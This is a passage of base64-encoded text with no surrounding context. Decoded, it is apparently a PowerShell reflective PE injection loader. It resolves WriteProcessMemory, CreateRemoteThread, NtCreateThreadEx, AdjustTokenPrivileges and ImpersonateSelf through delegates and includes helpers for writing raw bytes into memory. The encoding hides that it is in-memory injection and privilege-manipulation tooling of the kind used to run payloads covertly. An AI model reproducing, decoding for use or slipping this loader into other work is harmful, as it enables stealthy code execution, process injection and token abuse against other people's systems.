udFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKTsNCgkJCSRXcml0ZVByb2Nlc3NNZW1vcnkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciwgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFdyaXRlUHJvY2Vzc01lbW9yeSAtVmFsdWUgJFdyaXRlUHJvY2Vzc01lbW9yeTsNCgkJCSRSZWFkUHJvY2Vzc01lbW9yeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFJlYWRQcm9jZXNzTWVtb3J5Ow0KCQkJJFJlYWRQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKTsNCgkJCSRSZWFkUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRSZWFkUHJvY2Vzc01lbW9yeUFkZHIsICRSZWFkUHJvY2Vzc01lbW9yeURlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFJlYWRQcm9jZXNzTWVtb3J5IC1WYWx1ZSAkUmVhZFByb2Nlc3NNZW1vcnk7DQoJCQkkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlUmVtb3RlVGhyZWFkOw0KCQkJJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKTsNCgkJCSRDcmVhdGVSZW1vdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciwgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIENyZWF0ZVJlbW90ZVRocmVhZCAtVmFsdWUgJENyZWF0ZVJlbW90ZVRocmVhZDsNCgkJCSRHZXRFeGl0Q29kZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldEV4aXRDb2RlVGhyZWFkOw0KCQkJJEdldEV4aXRDb2RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKTsNCgkJCSRHZXRFeGl0Q29kZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRFeGl0Q29kZVRocmVhZEFkZHIsICRHZXRFeGl0Q29kZVRocmVhZERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEdldEV4aXRDb2RlVGhyZWFkIC1WYWx1ZSAkR2V0RXhpdENvZGVUaHJlYWQ7DQoJCQkkT3BlblRocmVhZFRva2VuQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgT3BlblRocmVhZFRva2VuOw0KCQkJJE9wZW5UaHJlYWRUb2tlbkRlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0Jvb2xdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pOw0KCQkJJE9wZW5UaHJlYWRUb2tlbiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRPcGVuVGhyZWFkVG9rZW5BZGRyLCAkT3BlblRocmVhZFRva2VuRGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgT3BlblRocmVhZFRva2VuIC1WYWx1ZSAkT3BlblRocmVhZFRva2VuOw0KCQkJJEdldEN1cnJlbnRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRDdXJyZW50VGhyZWFkOw0KCQkJJEdldEN1cnJlbnRUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQCgpIChbSW50UHRyXSk7DQoJCQkkR2V0Q3VycmVudFRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRHZXRDdXJyZW50VGhyZWFkQWRkciwgJEdldEN1cnJlbnRUaHJlYWREZWxlZ2F0ZSk7DQoJCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRDdXJyZW50VGhyZWFkIC1WYWx1ZSAkR2V0Q3VycmVudFRocmVhZDsNCgkJCSRBZGp1c3RUb2tlblByaXZpbGVnZXNBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBBZGp1c3RUb2tlblByaXZpbGVnZXM7DQoJCQkkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0pIChbQm9vbF0pOw0KCQkJJEFkanVzdFRva2VuUHJpdmlsZWdlcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRBZGp1c3RUb2tlblByaXZpbGVnZXNBZGRyLCAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzRGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzIC1WYWx1ZSAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzOw0KCQkJJExvb2t1cFByaXZpbGVnZVZhbHVlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgTG9va3VwUHJpdmlsZWdlVmFsdWVBOw0KCQkJJExvb2t1cFByaXZpbGVnZVZhbHVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbSW50UHRyXSkgKFtCb29sXSk7DQoJCQkkTG9va3VwUHJpdmlsZWdlVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTG9va3VwUHJpdmlsZWdlVmFsdWVBZGRyLCAkTG9va3VwUHJpdmlsZWdlVmFsdWVEZWxlZ2F0ZSk7DQoJCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMb29rdXBQcml2aWxlZ2VWYWx1ZSAtVmFsdWUgJExvb2t1cFByaXZpbGVnZVZhbHVlOw0KCQkJJEltcGVyc29uYXRlU2VsZkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIEltcGVyc29uYXRlU2VsZjsNCgkJCSRJbXBlcnNvbmF0ZVNlbGZEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50MzJdKSAoW0Jvb2xdKTsNCgkJCSRJbXBlcnNvbmF0ZVNlbGYgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSW1wZXJzb25hdGVTZWxmQWRkciwgJEltcGVyc29uYXRlU2VsZkRlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEltcGVyc29uYXRlU2VsZiAtVmFsdWUgJEltcGVyc29uYXRlU2VsZjsNCgkJCWlmICgoW0Vudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24gLWdlIChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LCAwKSkgLWFuZCAoW0Vudmlyb25tZW50XTo6T1NWZXJzaW9uLlZlcnNpb24gLWx0IChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LCAyKSkpDQoJCQl7DQoJCQkJJE50Q3JlYXRlVGhyZWFkRXhBZGRyID0gR2V0LVByb2NBZGRyZXNzIE50RGxsLmRsbCBOdENyZWF0ZVRocmVhZEV4Ow0KCQkJCSROdENyZWF0ZVRocmVhZEV4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtCb29sXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbVUludDMyXSk7DQoJCQkJJE50Q3JlYXRlVGhyZWFkRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTnRDcmVhdGVUaHJlYWRFeEFkZHIsICROdENyZWF0ZVRocmVhZEV4RGVsZWdhdGUpOw0KCQkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE50Q3JlYXRlVGhyZWFkRXggLVZhbHVlICROdENyZWF0ZVRocmVhZEV4Ow0KCQkJfQ0KCQkJJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBLZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3M7DQoJCQkkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0Jvb2xdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSk7DQoJCQkkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSk7DQoJCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJc1dvdzY0UHJvY2VzcyAtVmFsdWUgJElzV293NjRQcm9jZXNzOw0KCQkJJENyZWF0ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgS2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZDsNCgkJCSRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtJbnRQdHJdKTsNCgkJCSRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIENyZWF0ZVRocmVhZCAtVmFsdWUgJENyZWF0ZVRocmVhZDsNCgkJCXJldHVybiAkV2luMzJGdW5jdGlvbnM7DQoJCX0NCgkJRnVuY3Rpb24gU3ViLVNpZ25lZEludEFzVW5zaWduZWQNCgkJew0KCQkJUGFyYW0gKA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0ludDY0XSRWYWx1ZTEsDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50NjRdJFZhbHVlMg0KCQkJKQ0KCQkJW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSk7DQoJCQlbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKTsNCgkJCVtCeXRlW11dJEZpbmFsQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW1VJbnQ2NF0wKTsNCgkJCWlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkNCgkJCXsNCgkJCQkkQ2FycnlPdmVyID0gMDsNCgkJCQlmb3IgKCRpID0gMDsgJGkgLWx0ICRWYWx1ZTFCeXRlcy5Db3VudDsgJGkrKykNCgkJCQl7DQoJCQkJCSRWYWwgPSAkVmFsdWUxQnl0ZXNbJGldIC0gJENhcnJ5T3ZlcjsNCgkJCQkJaWYgKCRWYWwgLWx0ICRWYWx1ZTJCeXRlc1skaV0pDQoJCQkJCXsNCgkJCQkJCSRWYWwgKz0gMjU2Ow0KCQkJCQkJJENhcnJ5T3ZlciA9IDE7DQoJCQkJCX0NCgkJCQkJZWxzZQ0KCQkJCQl7DQoJCQkJCQkkQ2FycnlPdmVyID0gMDsNCgkJCQkJfQ0KCQkJCQlbVUludDE2XSRTdW0gPSAkVmFsIC0gJFZhbHVlMkJ5dGVzWyRpXTsNCgkJCQkJJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkY7DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSAyOw0KCQkJCXRocm93ICJDYW5ub3Qgc3VidHJhY3QgYnl0ZWFycmF5cyBvZiBkaWZmZXJlbnQgc2l6ZXMiOw0KCQkJfQ0KCQkJcmV0dXJuIFtCaXRDb252ZXJ0ZXJdOjpUb0ludDY0KCRGaW5hbEJ5dGVzLCAwKTsNCgkJfQ0KCQlGdW5jdGlvbiBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZA0KCQl7DQoJCQlQYXJhbSAoDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0NCgkJCQlbSW50NjRdJFZhbHVlMSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnQ2NF0kVmFsdWUyDQoJCQkpDQoJCQlbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKTsNCgkJCVtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpOw0KCQkJW0J5dGVbXV0kRmluYWxCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcyhbVUludDY0XTApOw0KCQkJaWYgKCRWYWx1ZTFCeXRlcy5Db3VudCAtZXEgJFZhbHVlMkJ5dGVzLkNvdW50KQ0KCQkJew0KCQkJCSRDYXJyeU92ZXIgPSAwOw0KCQkJCWZvciAoJGkgPSAwOyAkaSAtbHQgJFZhbHVlMUJ5dGVzLkNvdW50OyAkaSsrKQ0KCQkJCXsNCgkJCQkJW1VJbnQxNl0kU3VtID0gJFZhbHVlMUJ5dGVzWyRpXSArICRWYWx1ZTJCeXRlc1skaV0gKyAkQ2FycnlPdmVyOw0KCQkJCQkkRmluYWxCeXRlc1skaV0gPSAkU3VtIC1iYW5kIDB4MDBGRjsNCgkJCQkJaWYgKCgkU3VtIC1iYW5kIDB4RkYwMCkgLWVxIDB4MTAwKQ0KCQkJCQl7DQoJCQkJCQkkQ2FycnlPdmVyID0gMTsNCgkJCQkJfQ0KCQkJCQllbHNlDQoJCQkJCXsNCgkJCQkJCSRDYXJyeU92ZXIgPSAwOw0KCQkJCQl9DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSAzOw0KCQkJCXRocm93ICJDYW5ub3QgYWRkIGJ5dGVhcnJheXMgb2YgZGlmZmVyZW50IHNpemVzIjsNCgkJCX0NCgkJCXJldHVybiBbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkRmluYWxCeXRlcywgMCk7DQoJCX0NCgkJRnVuY3Rpb24gQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50DQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnQ2NF0kVmFsdWUxLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0ludDY0XSRWYWx1ZTINCgkJCSkNCgkJCVtCeXRlW11dJFZhbHVlMUJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTEpOw0KCQkJW0J5dGVbXV0kVmFsdWUyQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMik7DQoJCQlpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpDQoJCQl7DQoJCQkJZm9yICgkaSA9ICRWYWx1ZTFCeXRlcy5Db3VudCAtIDE7ICRpIC1nZSAwOyAkaS0tKQ0KCQkJCXsNCgkJCQkJaWYgKCRWYWx1ZTFCeXRlc1skaV0gLWd0ICRWYWx1ZTJCeXRlc1skaV0pDQoJCQkJCXsNCgkJCQkJCXJldHVybiAkdHJ1ZTsNCgkJCQkJfQ0KCQkJCQllbHNlaWYgKCRWYWx1ZTFCeXRlc1skaV0gLWx0ICRWYWx1ZTJCeXRlc1skaV0pDQoJCQkJCXsNCgkJCQkJCXJldHVybiAkZmFsc2U7DQoJCQkJCX0NCgkJCQl9DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDQ7DQoJCQkJdGhyb3cgIkNhbm5vdCBjb21wYXJlIGJ5dGUgYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplIjsNCgkJCX0NCgkJCXJldHVybiAkZmFsc2U7DQoJCX0NCgkJRnVuY3Rpb24gQ29udmVydC1VSW50VG9JbnQNCgkJew0KCQkJUGFyYW0gKA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1VJbnQ2NF0kVmFsdWUNCgkJCSkNCgkJCVtCeXRlW11dJFZhbHVlQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlKTsNCgkJCXJldHVybiAoW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJFZhbHVlQnl0ZXMsIDApKTsNCgkJfQ0KCQlGdW5jdGlvbiBHZXQtSGV4DQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCSRWYWx1ZQ0KCQkJKQ0KCQkJJFZhbHVlU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kVmFsdWUuR2V0VHlwZSgpKSAqIDI7DQoJCQkkSGV4ID0gIjB4ezA6WCQoJFZhbHVlU2l6ZSl9IiAtZiBbSW50NjRdJFZhbHVlOw0KCQkJcmV0dXJuICRIZXg7DQoJCX0NCgkJRnVuY3Rpb24gVGVzdC1NZW1vcnlSYW5nZVZhbGlkDQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtTdHJpbmddJERlYnVnU3RyaW5nLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW1N5c3RlbS5PYmplY3RdJFBFSW5mbywNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnRQdHJdJFN0YXJ0QWRkcmVzcywNCgkJCQlbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiU2l6ZSIsIFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtJbnRQdHJdJFNpemUNCgkJCSkNCgkJCVtJbnRQdHJdJEZpbmFsRW5kQWRkcmVzcyA9IFtJbnRQdHJdKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkU3RhcnRBZGRyZXNzKSAoJFNpemUpKTsNCgkJCSRQRUVuZEFkZHJlc3MgPSAkUEVJbmZvLkVuZEFkZHJlc3M7DQoJCQlpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJFBFSW5mby5QRUhhbmRsZSkgKCRTdGFydEFkZHJlc3MpKSAtZXEgJHRydWUpDQoJCQl7DQoJCQkJJGNtZFJlcy5WYWx1ZSA9IDU7DQoJCQkJdGhyb3cgIlRyeWluZyB0byB3cml0ZSB0byBtZW1vcnkgc21hbGxlciB0aGFuIGFsbG9jYXRlZCBhZGRyZXNzIHJhbmdlLiAkRGVidWdTdHJpbmciOw0KCQkJfQ0KCQkJaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRGaW5hbEVuZEFkZHJlc3MpICgkUEVFbmRBZGRyZXNzKSkgLWVxICR0cnVlKQ0KCQkJew0KCQkJCSRjbWRSZXMuVmFsdWUgPSA2Ow0KCQkJCXRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IGdyZWF0ZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIjsNCgkJCX0NCgkJfQ0KCQlGdW5jdGlvbiBXcml0ZS1CeXRlc1RvTWVtb3J5DQoJCXsNCgkJCVBhcmFtICgNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQ0KCQkJCVtCeXRlW11dJEJ5dGVzLA0KCQkJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldDQoJCQkJW0ludFB0cl0kTWVtb3J5QWRkcmVzcw0KCQkJKQ0KCQkJZm9yICgkT2Zmc2V0ID0gMDsgJE9mZnNldCAtbHQgJEJ5dGVzLkxlbmd0aDsgJE9mZnNldCsrKQ0KCQkJew0KCQkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OldyaXRlQnl0ZSgkTWVtb3J5QWRkcmVzcywgJE9mZnNldCwgJEJ5dGVzWyRPZmZzZXRdKTsNCgkJCX0NCgkJfQ0KCQlGdW5jdGlvbiBHZXQtRGVsZWdhdGVUeXBlDQoJCXsNCgkJCVBhcmFtDQoJCQkoDQoJCQkJW091dHB1dFR5cGUoW1R5cGVdKV0NCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCldDQoJCQkJW1R5cGVbXV0kUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksDQoJCQkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXQ0KCQkJCVtUeXBlXSRSZXR1cm5UeXBlID0gW1ZvaWRdDQoJCQkpDQoJCQkkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW47DQoJCQkkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKTsNCgkJCSRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bik7DQoJCQkkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpOw0KCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKTsNCgkJCSRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycyk7DQoJCQkkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKTsNCgkJCSRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKTsNCgkJCSRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKTsNCgkJCVdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQl9DQoJCUZ1bmN0aW9uIEdldC1Qcm9jQWRkcmVzcw0KCQl7DQoJCQlQYXJhbQ0KCQkJKA0KCQkJCVtPdXRwdXRUeXBlKFtJbnRQdHJdKV0NCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQ0KCQkJCVtTdHJpbmddJE1vZHVsZSwNCgkJCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQ0KCQkJCVtTdHJpbmddJFByb2NlZHVyZQ0KCQkJKQ0KCQkJJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwNCgkJCVdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGx